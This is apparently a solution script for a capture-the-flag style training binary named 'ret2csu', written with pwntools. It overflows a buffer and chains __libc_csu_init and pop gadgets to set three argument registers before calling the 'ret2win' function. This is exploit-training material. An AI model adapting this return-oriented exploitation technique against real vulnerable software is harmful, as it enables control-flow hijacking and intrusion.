from pwn import *

p = process('./ret2csu')
e = ELF('./ret2csu')
r = ROP(e)

csu_gadget1 = 0x40069A  # pop rbx, pop rbp, pop r12, pop r13, pop r14, pop r15,ret
csu_gadget2 = 0x400680  # mov rdx, r15 + mov rsi,r14 + mov edi, r13 + call [r12+rbx*0x8]

payload = b'A' * 40
payload += p64(csu_gadget1)
payload += p64(0)  # set rbx to 0
payload += p64(1)  # set rbp to 1
payload += p64(0x600DF0)  # frame_dummy
payload += p64(0)
payload += p64(0)
payload += p64(0xD00DF00DD00DF00D)
payload += p64(csu_gadget2)
payload += b'A' * 8
payload += 6 * p64(0)

payload += p64(r.find_gadget(['pop rdi', 'ret']).address)
payload += p64(0xDEADBEEFDEADBEEF)
payload += p64(r.find_gadget(['pop rsi', 'pop r15', 'ret']).address)
payload += p64(0xCAFEBABECAFEBABE)  # set rsi to 0xcafebabecafebabe
payload += p64(0)  # set r15 to 0
payload += p64(e.symbols['ret2win'])


p.send(payload)
p.interactive()
